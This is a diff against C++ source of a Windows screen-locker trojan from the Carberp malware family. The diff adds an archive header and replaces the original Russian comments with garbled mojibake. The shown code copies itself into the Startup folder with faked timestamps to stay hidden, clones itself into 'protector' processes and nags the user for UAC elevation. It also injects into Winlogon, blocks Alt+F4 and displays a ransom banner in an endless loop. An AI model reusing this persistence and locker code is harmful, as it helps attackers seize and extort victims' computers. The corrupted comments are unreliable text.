@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlobj.h>
 #include <tlhelp32.h>
@@ -129,13 +140,13 @@ public:
   {
     DWORD last_error = 0;
 
-    // Пробуем открыть дефолтный keyset.
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ keyset.
     if (::CryptAcquireContext(&m_provider, NULL, NULL, PROV_RSA_FULL, 0))
     {
       return TRUE;
     }
     
-    // Если его нет - попробуем открыть создать
+    // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     last_error = GetLastError();    
     if (last_error != NTE_BAD_KEYSET) 
     {
@@ -149,7 +160,7 @@ public:
       return TRUE;
     }
     
-    // Не удалось создать.
+    // пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     last_error = GetLastError();    
     PP_DPRINTF(L"RandomGen::Init: CryptAcquireContext with new keyset failed: last_error=0x%X",
       last_error);
@@ -275,24 +286,24 @@ void LookupFunctionalParamInCmdLine(
 {
   *param_length = 0;
   
-  // FIXME: память argv не освобождаем, потому что вызываем ф-цию 
-  //        всего пару раз на процесс. Проще забить.
+  // FIXME: пїЅпїЅпїЅпїЅпїЅпїЅ argv пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅпїЅ 
+  //        пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   int     argc=0;
   LPWSTR* argv=CommandLineToArgvW(GetCommandLineW(),&argc);
 
-  // Пробегаемсмя по всем параметрам.
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   for (int pix=0; pix < argc; pix++)
   {
     const WCHAR* parametr_name = argv[pix];
     DWORD length = wcslen(parametr_name);
     DWORD name_summ = 0;
 
-    // Проверка на префикс '--' для функционального параметра
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ '--' пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     if (length < 2) continue;
     if (parametr_name[0] != L'-') continue;
     if (parametr_name[1] != L'-') continue;
     
-    // Игнорим префикс в итоговой сумме
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     *param_addr    = &parametr_name[2];
     *param_length  = length - 2;
   }
@@ -308,13 +319,13 @@ StartFunction LookupStartFunction()
 
   PP_RETURNIF2(param_name_length == 0, StartFunction_Main);
 
-  // Вычисляем сумму
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
   for (DWORD i = 0; i < param_name_length; i++)
   {
     name_summ += param_name[i];
   }
   
-  // Находим ф-цию, для которой сумма от имени входит в промежуток
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
   for (int i=0; i < ARRAYSIZE(start_function_table);i++)
   {
     DWORD start = start_function_table[i].function_range_start;
@@ -337,10 +348,10 @@ void GetPathDirectory(
   DWORD*        returned_char_length
   )
 {
-  // Ищем директорию в пути.
-  // Примеры: 
-  //   для 'с:\testpath\file1.exe' должно найти 'с:\testpath\'
-  //   для 'file2'                 должно найти ''
+  // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: 
+  //   пїЅпїЅпїЅ 'пїЅ:\testpath\file1.exe' пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 'пїЅ:\testpath\'
+  //   пїЅпїЅпїЅ 'file2'                 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ ''
   const WCHAR* low_limit  = path;
   const WCHAR* high_limit = path + path_char_length;
 
@@ -365,10 +376,10 @@ void GetPathFileNameWithoutExt(
   DWORD*        returned_char_length
   )
 {
-  // Ищем имя файла, убирая расширение.
-  // Примеры: 
-  //   для 'с:\testpath\file1.exe' должно найти 'file1'
-  //   для 'с:\testpath\file2'     должно найти 'file2'
+  // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: 
+  //   пїЅпїЅпїЅ 'пїЅ:\testpath\file1.exe' пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 'file1'
+  //   пїЅпїЅпїЅ 'пїЅ:\testpath\file2'     пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 'file2'
   
   const WCHAR* low_limit = path;
   const WCHAR* high_limit = path + path_char_length;
@@ -524,7 +535,7 @@ void UAC_CreateRequestToUser()
     "	</trustInfo>\r\n"
     "</assembly>\r\n";
 
-  // Подстраховка от рекурсии вызовов процессов.
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   PP_RETURNIF1(UAC_CommandLineMarkedAsPrivilegeRun()); 
 
   // For Vista and later - ONLY
@@ -570,10 +581,10 @@ void UAC_CreateRequestToUser()
     manifest_path = file_path;
     manifest_path += L".manifest";
 
-    // Игнорим ошибки - вылезет при создании процесса.
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     ::CopyFile(self_path, file_path.c_str(), TRUE);
 
-    // Игнорим ошибки - вылезет при создании процесса.
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     HANDLE h = CreateFile(manifest_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
     if (h != INVALID_HANDLE_VALUE) 
     {
@@ -605,8 +616,8 @@ void UAC_CreateRequestToUser()
         ei.hProcess
         );
       
-      // Тут ошибки проверяем. 
-      // Но все равно продолжаем пытатся.
+      // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. 
+      // пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if (!executed) continue;
       
       DWORD exit_code = 1;
@@ -726,9 +737,9 @@ void SetFakeFileDateTime(const WCHAR* Path)
 
 void AddSelfBodyToAutorun()
 {
-  /// Получаем путь к папке автостарта.
-  /// Копируем себя в CSIDL_STARTUP и правим времена и аттрибуты файла,
-  /// чтобы он не светился в меню.
+  /// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  /// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ CSIDL_STARTUP пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ,
+  /// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
 
   WCHAR             self_path[MAX_PATH];
   PIDLIST_ABSOLUTE  id_list;
@@ -747,10 +758,10 @@ void AddSelfBodyToAutorun()
 
   wcscat_s(dst_file_path, dst_file_name);
 
-  // Проверяем на существование себя.
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   PP_RETURNIF1(GetFileAttributes(dst_file_path) != INVALID_FILE_ATTRIBUTES);
   
-  // Копируем себя в автостарт
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
   PP_RETURNIF1(CopyFile(self_path, dst_file_path, TRUE) == FALSE);
 
   SetFakeFileDateTime(dst_file_path);
@@ -780,31 +791,31 @@ void  StartFunction_ProtectFromWinlogon(LockerDll* loaded_dll)
   PP_RETURNIF1(loaded_dll->dll_base == NULL);
   PP_RETURNIF1(loaded_dll->StartWinlogonBlockInjecting == NULL);
 
-  // Нам нужны привилегии для прыжка в Winlogon.
+  // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ Winlogon.
   if (UAC_IsPrivilegesRequired())
   {
-    // Если их нету - проверяем не запустили ли нас уже на эскалацию?
+    // пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ?
     PP_DPRINTF(L"LockerExe: UAC privileges required!");
 
     if (UAC_CommandLineMarkedAsPrivilegeRun())
     {
-      // Таки так, запустили, но прав всё равно нету.
+      // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
       PP_DPRINTF(L"LockerExe: We already run as with UAC privileges, but we don't have"
         L" required rights!");
       
-      // Прекращаем рекурсию. Что-то не так с системой.
+      // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       ExitProcess(0);
     }
     else
     {
       PP_DPRINTF(L"LockerExe: We start in restricted mode. We start to ask user allow us required rights.");
 
-      // Так, можем бомжевать права UAC.
+      // пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ UAC.
       UAC_CreateRequestToUser();      
     } 
 
-    // Прав нет и мы сделали все что можно.
-    // Завершаемся с ошибкой.
+    // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     ExitProcess(1);
   }
 
@@ -827,8 +838,8 @@ void  StartFunction_ProtectIeFromAltF4(LockerDll* loaded_dll)
 
 void StartFunction_Main(LockerDll* loaded_dll)
 {
-  /// Если в командной строке есть что-то кроме своего пути -
-  /// оно запускается и процесс работы продолжается.
+  /// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ -
+  /// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   int argc=0;
   LPWSTR *argv=CommandLineToArgvW(GetCommandLineW(),&argc);
@@ -843,12 +854,12 @@ void StartFunction_Main(LockerDll* loaded_dll)
 
   AddSelfBodyToAutorun();
 
-  // Клонируем себя в разные ехе и запускаем протекторы
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
   CloneSelfProtectorsAndRun();
 
-  // Если мы на системе с поддержкой UAC и 
-  // у нас не хватает привилегий - ждем пока наши 
-  // протекторы пытаются получить UAC.
+  // пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ UAC пїЅ 
+  // пїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ 
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ UAC.
   if (UAC_IsSystemSupported() && UAC_IsPrivilegesRequired())
   {
     DWORD timeout = 30;
@@ -858,10 +869,10 @@ void StartFunction_Main(LockerDll* loaded_dll)
     Sleep(timeout * 1000);
   }
 
-  /// Запуск процесс показа банера
+  /// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
   loaded_dll->StartBanner(loaded_dll->dll_body);
   
-  /// Бесконечный цикл работы.
+  /// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   while (true)
   {
     Sleep(1);
@@ -1071,8 +1082,8 @@ int CALLBACK WinMain(
   __in  int nCmdShow
 )
 {
-  // Для использования ф-циями из getapi.h надо инициализировать 
-  // указатель на ntdll.dll
+  // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ getapi.h пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ntdll.dll
   InitializeNTDLL();
 
   //Test();
